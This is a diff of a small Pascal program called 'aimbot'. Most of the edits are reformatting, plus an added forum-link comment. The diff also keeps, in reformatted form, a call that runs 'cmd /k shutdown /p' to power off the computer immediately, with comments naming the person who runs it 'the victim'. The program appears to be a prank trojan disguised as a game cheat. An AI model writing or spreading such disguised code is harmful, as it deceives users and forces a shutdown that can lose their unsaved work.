@@ -1,8 +1,8 @@
 program aimbot;
 
-
 uses sysutils, ShellApi, Windows, JwaTlHelp32, crt;
 
+// from https://forum.lazarus.freepascal.org/index.php?topic=27099.0
 function WindowsAppIsRunning(const ExeName: string): integer;
 var
     ContinueLoop: BOOL;
@@ -28,7 +28,7 @@ end;
 
 function randomEx(x, y: longint): longint;
 begin
-	randomEx:= random((y + 1) - x) + x;
+    randomEx:= random((y + 1) - x) + x;
 end;
 
 procedure FinishHim();
@@ -57,10 +57,9 @@ begin
     writeln('........');
     writeln;
 
-    ShellExecute(0, nil, PChar('cmd'), PChar('/k shutdown /p'), nil, 1);
-    //basically, it turns off the pc.
-    readln;
-    // so he victim sees the nice F
+    ShellExecute(0, nil, PChar('cmd'), PChar('/k shutdown /p'), nil, 1); //basically, it turns off the pc.
+    
+    readln; // so he victim sees the nice F
 
 end;
 
